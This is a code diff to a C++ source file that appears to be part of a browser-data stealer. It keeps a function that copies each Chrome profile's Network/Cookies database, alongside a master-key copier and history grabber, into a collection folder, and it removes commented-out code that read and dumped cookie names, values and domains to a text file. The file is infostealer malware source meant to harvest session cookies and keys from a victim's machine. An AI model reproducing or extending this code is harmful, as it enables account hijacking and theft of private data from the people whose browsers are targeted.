@@ -27,22 +27,6 @@
 #include "../../helper/helper.h"
 #include <fstream>
 #include <vector>
-#include "../../dependencies/sqlite/sqlite3.h"
-
-/*
-#include "Base64.h"
-#include "binaryhandler.hpp"
-#include <cstdio>
-#include <iostream>
-#include "json.hpp"
-#include <map>
-//#include "plusaes_wrapper.hpp"
-#include <string>
-#include <windows.h>
-#include <Wincrypt.h>
-#pragma comment(lib, "user32")
-#pragma comment(lib, "Crypt32")
-*/
 
 namespace global 
 {
@@ -73,7 +57,7 @@ namespace global
     };
 }
 
-int GetCookies(std::string path , std::string profile, int counter);
+void GetCookies(std::string path , std::string profile, int counter);
 
 void GetHistory(std::string path, std::string profile, int counter);
 
@@ -168,71 +152,12 @@ void CopyMasterKey(std::string path, int counter)
 }
 
 
-int GetCookies(std::string path, std::string profile, int counter)
+void GetCookies(std::string path, std::string profile, int counter)
 {
     // Path to Chrome's cookies database
     std::string cookiesDbPath = path + "/" + profile+ "/Network/Cookies";
 
     func::copyFile(cookiesDbPath, global::defaultPath + global::names[counter]+ "/Cookies_" + profile);
-    /*
-    // Open the cookies database
-    sqlite3* db;
-    int result = sqlite3_open(cookiesDbPath.c_str(), &db);
-    if (result != SQLITE_OK) {
-        std::cerr << "Failed to open cookies database: " << sqlite3_errmsg(db) << std::endl;
-        return 1;
-    }
-
-    // SQL query to select cookies
-    std::string query = "SELECT * FROM cookies";
-
-    // Execute the query
-    sqlite3_stmt* stmt;
-    result = sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr);
-    if (result != SQLITE_OK) {
-        std::cerr << "Failed to execute query: " << sqlite3_errmsg(db) << std::endl;
-        sqlite3_close(db);
-        return 1;
-    }
-
-    // Open the output file for writing
-    std::ofstream outputFile("cookies_"+ profile +".txt");
-    if (!outputFile.is_open()) {
-        std::cerr << "Failed to open output file" << std::endl;
-        sqlite3_finalize(stmt);
-        sqlite3_close(db);
-        return 1;
-    }
-
-    // Fetch the results and write cookies to the file
-    while (sqlite3_step(stmt) == SQLITE_ROW) {
-        // Extract cookie values from the result row
-        std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
-        std::string value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
-        std::string domain = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
-
-        // C:\Users\darkd\AppData\Local\Google\Chrome\User Data\Local State
-       // std::string domainDec = decrypt_c32(domain);
-
-        // Write the cookie details to the file
-        outputFile << "Name: " << name << std::endl;
-        outputFile << "Value: " << value << std::endl;
-        outputFile << "Domain: " << domain << std::endl;
-        outputFile << "-----------------------------" << std::endl << std::endl;
-    }
-
-    // Close the output file
-    outputFile.close();
-
-    // Close the database connection
-    sqlite3_finalize(stmt);
-    sqlite3_close(db);
-
-    std::cout << "Cookies exported to cookies.txt" << std::endl;
-
-    return 0;
-    */
-    return 0;
 }
 
 void GetHistory(std::string path, std::string profile, int counter)
